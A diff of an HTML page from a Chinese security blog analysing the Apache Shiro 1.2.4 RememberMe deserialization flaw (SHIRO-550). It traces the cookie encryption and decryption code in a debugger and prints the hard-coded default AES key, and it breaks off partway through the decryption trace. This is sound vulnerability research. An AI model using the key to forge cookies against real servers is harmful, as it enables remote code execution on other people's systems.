@@ -1,9 +1,9 @@
-<!DOCTYPE html><html lang="zh-CN"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1"><meta name="format-detection" content="telephone=no"><meta name="apple-mobile-web-app-capable" content="yes"><meta name="apple-mobile-web-app-status-bar-style" content="black"><link rel="icon" href="/images/favicon-16x16.png?v=2.1.1" type="image/png" sizes="16x16"><link rel="icon" href="/images/favicon-32x32.png?v=2.1.1" type="image/png" sizes="32x32"><meta name="description" content="漏洞简介        Apache Shiro 是一款开源安全框架，提供身份验证、授权、密码学和会话管理。Shiro框架直观、易用，同时也能提供健壮的安全性。 Apache Shiro 1.2.4及以前版本中，加密的用户信息序列化后存储在名为 RememberMe 的 Cookie 中。攻击者可以使用 Shiro 的默认密钥伪造用户 Cookie，触发Java反序列化漏洞，">
+<!DOCTYPE html><html lang="zh-CN"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1"><meta name="format-detection" content="telephone=no"><meta name="apple-mobile-web-app-capable" content="yes"><meta name="apple-mobile-web-app-status-bar-style" content="black"><link rel="icon" href="/images/favicon-16x16.png?v=2.1.1" type="image/png" sizes="16x16"><link rel="icon" href="/images/favicon-32x32.png?v=2.1.1" type="image/png" sizes="32x32"><meta name="description" content="漏洞简介       Apache Shiro 是一款开源安全框架，提供身份验证、授权、密码学和会话管理。Shiro框架直观、易用，同时也能提供健壮的安全性。Apache Shiro 1.2.4及以前版本中，加密的用户信息序列化后存储在名为 RememberMe 的 Cookie 中。攻击者可以使用 Shiro 的默认密钥伪造用户 Cookie，触发Java反序列化漏洞，进而">
 <meta property="og:type" content="article">
 <meta property="og:title" content="Apache Shiro 1.2.4反序列化漏洞">
 <meta property="og:url" content="http://yoursite.com/2020/08/31/Apache%20Shiro%201.2.4%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/index.html">
 <meta property="og:site_name" content="Whippet&#39;s Blog">
-<meta property="og:description" content="漏洞简介        Apache Shiro 是一款开源安全框架，提供身份验证、授权、密码学和会话管理。Shiro框架直观、易用，同时也能提供健壮的安全性。 Apache Shiro 1.2.4及以前版本中，加密的用户信息序列化后存储在名为 RememberMe 的 Cookie 中。攻击者可以使用 Shiro 的默认密钥伪造用户 Cookie，触发Java反序列化漏洞，">
+<meta property="og:description" content="漏洞简介       Apache Shiro 是一款开源安全框架，提供身份验证、授权、密码学和会话管理。Shiro框架直观、易用，同时也能提供健壮的安全性。Apache Shiro 1.2.4及以前版本中，加密的用户信息序列化后存储在名为 RememberMe 的 Cookie 中。攻击者可以使用 Shiro 的默认密钥伪造用户 Cookie，触发Java反序列化漏洞，进而">
 <meta property="og:locale" content="zh_CN">
 <meta property="og:image" content="http://yoursite.com/2020/08/31/Apache%20Shiro%201.2.4%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/20200901150608.png">
 <meta property="og:image" content="http://yoursite.com/2020/08/31/Apache%20Shiro%201.2.4%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/20200831152913.png">
@@ -46,7 +46,7 @@
 <meta property="og:image" content="http://yoursite.com/2020/08/31/Apache%20Shiro%201.2.4%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/20200903111120.png">
 <meta property="og:image" content="http://yoursite.com/2020/08/31/Apache%20Shiro%201.2.4%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/20200903112157.png">
 <meta property="article:published_time" content="2020-08-31T06:37:52.000Z">
-<meta property="article:modified_time" content="2020-09-14T03:19:24.920Z">
+<meta property="article:modified_time" content="2020-09-14T03:21:06.230Z">
 <meta property="article:author" content="whippet">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:image" content="http://yoursite.com/2020/08/31/Apache%20Shiro%201.2.4%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/20200901150608.png"><title>Apache Shiro 1.2.4反序列化漏洞 | Whippet's Blog</title><link ref="canonical" href="http://yoursite.com/2020/08/31/Apache%20Shiro%201.2.4%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/"><link rel="dns-prefetch" href="https://cdn.jsdelivr.net"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5.12.1/css/all.min.css" type="text/css"><link rel="stylesheet" href="/css/index.css?v=2.1.1"><script>var Stun = window.Stun || {};
@@ -74,84 +74,49 @@ var CONFIG = {
 
 window.CONFIG = CONFIG;</script><meta name="generator" content="Hexo 5.1.1"></head><body><div class="container" id="container"><header class="header" id="header"><div class="header-inner"><nav class="header-nav header-nav--fixed"><div class="header-nav-inner"><div class="header-nav-menubtn"><i class="fas fa-bars"></i></div><div class="header-nav-menu"><div class="header-nav-menu-item"><a class="header-nav-menu-item__link" href="/"><span class="header-nav-menu-item__icon"><i class="fas fa-home"></i></span><span class="header-nav-menu-item__text">首页</span></a></div><div class="header-nav-menu-item"><a class="header-nav-menu-item__link" href="/archives/"><span class="header-nav-menu-item__icon"><i class="fas fa-folder-open"></i></span><span class="header-nav-menu-item__text">归档</span></a></div><div class="header-nav-menu-item"><a class="header-nav-menu-item__link" href="/tags/"><span class="header-nav-menu-item__icon"><i class="fas fa-tags"></i></span><span class="header-nav-menu-item__text">标签</span></a></div><div class="header-nav-menu-item"><a class="header-nav-menu-item__link" href="/friendship/"><span class="header-nav-menu-item__icon"><i class="fas fa-link"></i></span><span class="header-nav-menu-item__text">友链</span></a></div></div></div></nav><div class="header-banner"><div class="header-banner-info"><div class="header-banner-info__title">Whippet's Blog</div><div class="header-banner-info__subtitle"></div></div></div></div></header><main class="main" id="main"><div class="main-inner"><div class="content-wrap" id="content-wrap"><div class="content" id="content"><!-- Just used to judge whether it is an article page--><div id="is-post"></div><div class="post"><header class="post-header"><h1 class="post-title">Apache Shiro 1.2.4反序列化漏洞</h1><div class="post-meta"><span class="post-meta-item post-meta-item--createtime"><span class="post-meta-item__icon"><i class="far fa-calendar-plus"></i></span><span class="post-meta-item__info">发表于</span><span class="post-meta-item__value">2020-08-31</span></span><span class="post-meta-item post-meta-item--updatetime"><span class="post-meta-item__icon"><i class="far fa-calendar-check"></i></span><span class="post-meta-item__info">更新于</span><span class="post-meta-item__value">2020-09-14</span></span></div></header><div class="post-body"><h2 id="漏洞简介">
           <a href="#漏洞简介" class="heading-link"><i class="fas fa-link"></i></a>漏洞简介</h2>
-      
-<p>Apache Shiro 是一款开源安全框架，提供身份验证、授权、密码学和会话管理。Shiro框架直观、易用，同时也能提供健壮的安全性。<br>
-Apache Shiro 1.2.4及以前版本中，加密的用户信息序列化后存储在名为 RememberMe 的 Cookie 中。攻击者可以使用 Shiro 的默认密钥伪造用户 Cookie，触发Java反序列化漏洞，进而在目标机器上执行任意命令。</p>
+      <p>Apache Shiro 是一款开源安全框架，提供身份验证、授权、密码学和会话管理。Shiro框架直观、易用，同时也能提供健壮的安全性。<br>Apache Shiro 1.2.4及以前版本中，加密的用户信息序列化后存储在名为 RememberMe 的 Cookie 中。攻击者可以使用 Shiro 的默认密钥伪造用户 Cookie，触发Java反序列化漏洞，进而在目标机器上执行任意命令。</p>
 <a id="more"></a>
-<p><span class="exturl"><a class="exturl__link" target="_blank" rel="noopener" href="https://issues.apache.org/jira/browse/SHIRO-550">SHIRO-550</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span><br>
-<img src="/2020/08/31/Apache%20Shiro%201.2.4%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/20200901150608.png" alt=""><br>
-在识别身份的时候，需要对 Cookie 里的 RememberMe 字段解密,解密的顺序为：</p>
+<p><span class="exturl"><a class="exturl__link" target="_blank" rel="noopener" href="https://issues.apache.org/jira/browse/SHIRO-550">SHIRO-550</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span><br><img src="/2020/08/31/Apache%20Shiro%201.2.4%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/20200901150608.png"><br>在识别身份的时候，需要对 Cookie 里的 RememberMe 字段解密,解密的顺序为：</p>
 <ul>
 <li>检索cookie中RememberMe的值</li>
 <li>Base64解码</li>
 <li>使用AES解密</li>
-<li>反序列化</li>
+<li>反序列化  </li>
 </ul>
 <p>但是，AES 加密的秘钥被硬编码在代码里，每个人通过源代码都可以拿到 AES 加密的密钥。所以当攻击者将恶意的 payload 进行序列化、AES 加密、base64 编码，作为 Cookie 的 RememberMe 字段发送。Shiro 将 RememberMe 进行解密并且反序列化，最终造成反序列化漏洞。</p>
 
         <h2 id="漏洞分析">
           <a href="#漏洞分析" class="heading-link"><i class="fas fa-link"></i></a>漏洞分析</h2>
-      
-<p>获取 Apache Shiro 存在漏洞的源代码</p>
+      <p>获取 Apache Shiro 存在漏洞的源代码</p>
 <figure class="highlight shell"><div class="table-container"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">git clone https://github.com/apache/shiro.git    </span><br><span class="line">cd shiro  </span><br><span class="line">git checkout shiro-root-1.2.4</span><br></pre></td></tr></tbody></table></div></figure>
 <p>修改 /shiro/samples/web/pom.xml</p>
 <figure class="highlight xml"><div class="table-container"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>javax.servlet<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>jstl<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>1.2<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">scope</span>&gt;</span>runtime<span class="tag">&lt;/<span class="name">scope</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>taglibs<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>standard<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>1.1.2<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">scope</span>&gt;</span>runtime<span class="tag">&lt;/<span class="name">scope</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></tbody></table></div></figure>
-<p>然后用idea导入mvn项目<br>
-<img src="/2020/08/31/Apache%20Shiro%201.2.4%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/20200831152913.png" alt=""></p>
-<p>设置run/debug configurations， 添加本地tomcat环境<br>
-<img src="/2020/08/31/Apache%20Shiro%201.2.4%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/20200831162735.png" alt=""></p>
-<p><img src="/2020/08/31/Apache%20Shiro%201.2.4%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/20200831163009.png" alt=""></p>
-<p>在 <code>org.apache.shiro.mgt.RememberMeManager#onSuccessfulLogin</code> 处添加断点，然后debug 开启 tomcat 服务<br>
-<img src="/2020/08/31/Apache%20Shiro%201.2.4%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/20200831172519.png" alt=""></p>
-<p><img src="/2020/08/31/Apache%20Shiro%201.2.4%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/20200831173036.png" alt=""></p>
+<p>然后用idea导入mvn项目<br><img src="/2020/08/31/Apache%20Shiro%201.2.4%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/20200831152913.png"></p>
+<p>设置run/debug configurations， 添加本地tomcat环境<br><img src="/2020/08/31/Apache%20Shiro%201.2.4%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/20200831162735.png"></p>
+<p><img src="/2020/08/31/Apache%20Shiro%201.2.4%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/20200831163009.png"></p>
+<p>在 <code>org.apache.shiro.mgt.RememberMeManager#onSuccessfulLogin</code> 处添加断点，然后debug 开启 tomcat 服务<br><img src="/2020/08/31/Apache%20Shiro%201.2.4%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/20200831172519.png"></p>
+<p><img src="/2020/08/31/Apache%20Shiro%201.2.4%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/20200831173036.png"></p>
 
         <h3 id="加密过程">
           <a href="#加密过程" class="heading-link"><i class="fas fa-link"></i></a>加密过程</h3>
-      
-<p>登录账户root/secret，勾选上Remember Me的按钮，程序会停在断点处，用户名和密码也会存储在 token 中<br>
-<img src="/2020/08/31/Apache%20Shiro%201.2.4%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/20200901110408.png" alt=""><br>
-forgetIdentity 针对 subject 变量进行处理，跟进 forgetIdentity 方法<br>
-<code>org.apache.shiro.web.mgt.CookieRememberMeManager#forgetIdentity(org.apache.shiro.subject.Subject)</code><br>
-<img src="/2020/08/31/Apache%20Shiro%201.2.4%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/20200901160011.png" alt=""></p>
-<p>调用 forgetIdentity 构造方法处理 request 和 reponse 请求<br>
-<code>org.apache.shiro.web.mgt.CookieRememberMeManager#forgetIdentity(javax.servlet.http.HttpServletRequest, javax.servlet.http.HttpServletResponse)</code><br>
-<img src="/2020/08/31/Apache%20Shiro%201.2.4%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/20200901160152.png" alt=""></p>
-<p>跟进 removeFrom 方法，在 response 响应头中加入了一些cookie信息。<br>
-<code>org.apache.shiro.web.servlet.SimpleCookie#removeFrom</code><br>
-<img src="/2020/08/31/Apache%20Shiro%201.2.4%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/20200901160701.png" alt=""></p>
-<p>回到 onSuccessfulLogin<br>
-<img src="/2020/08/31/Apache%20Shiro%201.2.4%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/20200901161139.png" alt=""></p>
-<p>调用 rememberIdentity 生成 cookie 中的 remember 字段。跟进 rememberIdentity 方法。<br>
-<code>org.apache.shiro.mgt.AbstractRememberMeManager#rememberIdentity(org.apache.shiro.subject.Subject, org.apache.shiro.authc.AuthenticationToken, org.apache.shiro.authc.AuthenticationInfo)</code><br>
-<img src="/2020/08/31/Apache%20Shiro%201.2.4%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/20200901110834.png" alt=""></p>
-<p>通过 getIdentityToRemember 获取用户的身份，继续跟进 rememberIdentity 方法。<br>
-<code>org.apache.shiro.mgt.AbstractRememberMeManager#rememberIdentity(org.apache.shiro.subject.Subject, org.apache.shiro.subject.PrincipalCollection)</code><br>
-<img src="/2020/08/31/Apache%20Shiro%201.2.4%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/20200901113024.png" alt=""></p>
-<p>调用 convertPrincipalsToBytes 方法将 accountPrincipals &lt;“root”&gt; 转换为字节形式，跟进 convertPrincipalsToBytes 方法。<br>
-<code>org.apache.shiro.mgt.AbstractRememberMeManager#convertPrincipalsToBytes</code><br>
-<img src="/2020/08/31/Apache%20Shiro%201.2.4%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/20200901113616.png" alt=""></p>
-<p>转换过程中首先对用户的 id 进行序列化，然后利用 encrypt 进行加密。<br>
-<code>org.apache.shiro.mgt.AbstractRememberMeManager#encrypt</code><br>
-<img src="/2020/08/31/Apache%20Shiro%201.2.4%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/20200901114502.png" alt=""></p>
-<p>加密的密钥由getEncryptionCipherKey()得到<br>
-<img src="/2020/08/31/Apache%20Shiro%201.2.4%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/20200901161804.png" alt=""></p>
-<p>getEncryptionCipherKey 实际上是开头中的 DEFAULT_CIPHER_KEY_BYTES 的常量  <code>kPH+bIxk5D2deZiIxcaaaA==</code></p>
+      <p>登录账户root/secret，勾选上Remember Me的按钮，程序会停在断点处，用户名和密码也会存储在 token 中<br><img src="/2020/08/31/Apache%20Shiro%201.2.4%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/20200901110408.png"><br>forgetIdentity 针对 subject 变量进行处理，跟进 forgetIdentity 方法<br><code>org.apache.shiro.web.mgt.CookieRememberMeManager#forgetIdentity(org.apache.shiro.subject.Subject)</code><br><img src="/2020/08/31/Apache%20Shiro%201.2.4%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/20200901160011.png"></p>
+<p>调用 forgetIdentity 构造方法处理 request 和 reponse 请求<br><code>org.apache.shiro.web.mgt.CookieRememberMeManager#forgetIdentity(javax.servlet.http.HttpServletRequest, javax.servlet.http.HttpServletResponse)</code><br><img src="/2020/08/31/Apache%20Shiro%201.2.4%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/20200901160152.png"></p>
+<p>跟进 removeFrom 方法，在 response 响应头中加入了一些cookie信息。<br><code>org.apache.shiro.web.servlet.SimpleCookie#removeFrom</code><br><img src="/2020/08/31/Apache%20Shiro%201.2.4%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/20200901160701.png"></p>
+<p>回到 onSuccessfulLogin<br><img src="/2020/08/31/Apache%20Shiro%201.2.4%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/20200901161139.png"> </p>
+<p>调用 rememberIdentity 生成 cookie 中的 remember 字段。跟进 rememberIdentity 方法。<br><code>org.apache.shiro.mgt.AbstractRememberMeManager#rememberIdentity(org.apache.shiro.subject.Subject, org.apache.shiro.authc.AuthenticationToken, org.apache.shiro.authc.AuthenticationInfo)</code><br><img src="/2020/08/31/Apache%20Shiro%201.2.4%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/20200901110834.png"></p>
+<p>通过 getIdentityToRemember 获取用户的身份，继续跟进 rememberIdentity 方法。<br><code>org.apache.shiro.mgt.AbstractRememberMeManager#rememberIdentity(org.apache.shiro.subject.Subject, org.apache.shiro.subject.PrincipalCollection)</code><br><img src="/2020/08/31/Apache%20Shiro%201.2.4%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/20200901113024.png"></p>
+<p>调用 convertPrincipalsToBytes 方法将 accountPrincipals &lt;“root”&gt; 转换为字节形式，跟进 convertPrincipalsToBytes 方法。<br><code>org.apache.shiro.mgt.AbstractRememberMeManager#convertPrincipalsToBytes</code><br><img src="/2020/08/31/Apache%20Shiro%201.2.4%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/20200901113616.png">  </p>
+<p>转换过程中首先对用户的 id 进行序列化，然后利用 encrypt 进行加密。<br><code>org.apache.shiro.mgt.AbstractRememberMeManager#encrypt</code><br><img src="/2020/08/31/Apache%20Shiro%201.2.4%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/20200901114502.png"></p>
+<p>加密的密钥由getEncryptionCipherKey()得到<br><img src="/2020/08/31/Apache%20Shiro%201.2.4%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/20200901161804.png"></p>
+<p> getEncryptionCipherKey 实际上是开头中的 DEFAULT_CIPHER_KEY_BYTES 的常量  <code>kPH+bIxk5D2deZiIxcaaaA==</code> </p>
 <hr>
-<p><strong>密钥分析</strong><br>
-<code>org.apache.shiro.mgt.AbstractRememberMeManager#AbstractRememberMeManager</code><br>
-<img src="/2020/08/31/Apache%20Shiro%201.2.4%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/20200902165243.png" alt=""></p>
-<p><code>org.apache.shiro.mgt.AbstractRememberMeManager#setCipherKey</code><br>
-<img src="/2020/08/31/Apache%20Shiro%201.2.4%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/20200902165447.png" alt=""></p>
-<p><code>org.apache.shiro.mgt.AbstractRememberMeManager#setEncryptionCipherKey</code><br>
-<img src="/2020/08/31/Apache%20Shiro%201.2.4%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/20200902165613.png" alt=""></p>
-<p><code>org.apache.shiro.mgt.AbstractRememberMeManager#getEncryptionCipherKey</code><br>
-<img src="/2020/08/31/Apache%20Shiro%201.2.4%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/20200902165708.png" alt=""></p>
+<p><strong>密钥分析</strong><br><code>org.apache.shiro.mgt.AbstractRememberMeManager#AbstractRememberMeManager</code><br><img src="/2020/08/31/Apache%20Shiro%201.2.4%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/20200902165243.png"></p>
+<p><code>org.apache.shiro.mgt.AbstractRememberMeManager#setCipherKey</code><br><img src="/2020/08/31/Apache%20Shiro%201.2.4%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/20200902165447.png"></p>
+<p><code>org.apache.shiro.mgt.AbstractRememberMeManager#setEncryptionCipherKey</code><br><img src="/2020/08/31/Apache%20Shiro%201.2.4%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/20200902165613.png"></p>
+<p><code>org.apache.shiro.mgt.AbstractRememberMeManager#getEncryptionCipherKey</code><br><img src="/2020/08/31/Apache%20Shiro%201.2.4%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/20200902165708.png"></p>
 <hr>
-<p>继续单步执行，返回 rememberIdentity 函数<br>
-<img src="/2020/08/31/Apache%20Shiro%201.2.4%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/20200901120950.png" alt=""></p>
-<p>跟进函数 rememberSerializedIdentity <code>org.apache.shiro.web.mgt.CookieRememberMeManager#rememberSerializedIdentity</code><br>
-<img src="/2020/08/31/Apache%20Shiro%201.2.4%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/20200901121229.png" alt=""><br>
-对值进行 base64 编码之后，设置到 cookie 中。</p>
+<p>继续单步执行，返回 rememberIdentity 函数<br><img src="/2020/08/31/Apache%20Shiro%201.2.4%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/20200901120950.png"></p>
+<p>跟进函数 rememberSerializedIdentity <code>org.apache.shiro.web.mgt.CookieRememberMeManager#rememberSerializedIdentity</code><br><img src="/2020/08/31/Apache%20Shiro%201.2.4%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/20200901121229.png"><br>对值进行 base64 编码之后，设置到 cookie 中。</p>
 <p>当我们勾选 RememberMe 选项框之后，点击登陆之后，后端会进行如下操作。</p>
 <ul>
 <li>序列化用户 id</li>
@@ -159,33 +124,18 @@ forgetIdentity 针对 subject 变量进行处理，跟进 forgetIdentity 方法<
 <li>base64 编码</li>
 <li>设置到 cookie 中的 rememberme 字段</li>
 </ul>
-<p><img src="/2020/08/31/Apache%20Shiro%201.2.4%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/20200901124515.png" alt=""></p>
+<p><img src="/2020/08/31/Apache%20Shiro%201.2.4%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/20200901124515.png"></p>
 
         <h3 id="解密过程">
           <a href="#解密过程" class="heading-link"><i class="fas fa-link"></i></a>解密过程</h3>
-      
-<p>在 <code>org.apache.shiro.mgt.DefaultSecurityManager#getRememberedIdentity</code> 添加断点，然后发送一个带有 readmemberMe  cookie的请求。<br>
-<img src="/2020/08/31/Apache%20Shiro%201.2.4%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/20200901164444.png" alt=""></p>
-<p>跟进函数 getRememberedPrincipals<br>
-<code>org.apache.shiro.mgt.AbstractRememberMeManager#getRememberedPrincipals</code><br>
-<img src="/2020/08/31/Apache%20Shiro%201.2.4%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/20200901165422.png" alt=""></p>
-<p>调用 getRememberedSerializedIdentity 针对http请求进行处理，跟进 getRememberedSerializedIdentity<br>
-<code> org.apache.shiro.web.mgt.CookieRememberMeManager#getRememberedSerializedIdentity</code><br>
-<img src="/2020/08/31/Apache%20Shiro%201.2.4%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/20200901170053.png" alt=""></p>
-<p>getCookie 构造方法先获取 cookie 信息,readValue 方法，根据 Cookie 中的 name 字段获取 Cookie 的值，然后返回 Cookie 的值<br>
-<img src="/2020/08/31/Apache%20Shiro%201.2.4%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/20200901170622.png" alt=""></p>
-<p>然后调用 <code>byte[] decoded = Base64.decode(base64)</code>处理 base64 加密的 Cookie 信息，并且将这个 Cookie 转化为二进制字节码<br>
-<img src="/2020/08/31/Apache%20Shiro%201.2.4%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/20200901170847.png" alt=""></p>
-<p>回到 getRememberedPrincipals，继续跟进 convertBytesToPrincipals 函数<br>
-<code>org.apache.shiro.mgt.AbstractRememberMeManager#convertBytesToPrincipals</code><br>
-<img src="/2020/08/31/Apache%20Shiro%201.2.4%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/20200901171410.png" alt=""></p>
-<p>AES 解密  <code>org.apache.shiro.mgt.AbstractRememberMeManager#decrypt</code><br>
-<img src="/2020/08/31/Apache%20Shiro%201.2.4%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/20200901171905.png" alt=""></p>
-<p>反序列化 <code>org.apache.shiro.mgt.AbstractRememberMeManager#deserialize</code><br>
-<img src="/2020/08/31/Apache%20Shiro%201.2.4%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/20200902114203.png" alt=""><br>
-<code>org.apache.shiro.io.DefaultSerializer#deserialize</code><br>
-<img src="/2020/08/31/Apache%20Shiro%201.2.4%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/20200902114258.png" alt=""><br>
-看到 <code>readObject()</code></p>
+      <p>在 <code>org.apache.shiro.mgt.DefaultSecurityManager#getRememberedIdentity</code> 添加断点，然后发送一个带有 readmemberMe  cookie的请求。<br><img src="/2020/08/31/Apache%20Shiro%201.2.4%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/20200901164444.png"></p>
+<p>跟进函数 getRememberedPrincipals<br><code>org.apache.shiro.mgt.AbstractRememberMeManager#getRememberedPrincipals</code><br><img src="/2020/08/31/Apache%20Shiro%201.2.4%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/20200901165422.png"></p>
+<p>调用 getRememberedSerializedIdentity 针对http请求进行处理，跟进 getRememberedSerializedIdentity<br><code> org.apache.shiro.web.mgt.CookieRememberMeManager#getRememberedSerializedIdentity</code><br><img src="/2020/08/31/Apache%20Shiro%201.2.4%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/20200901170053.png"></p>
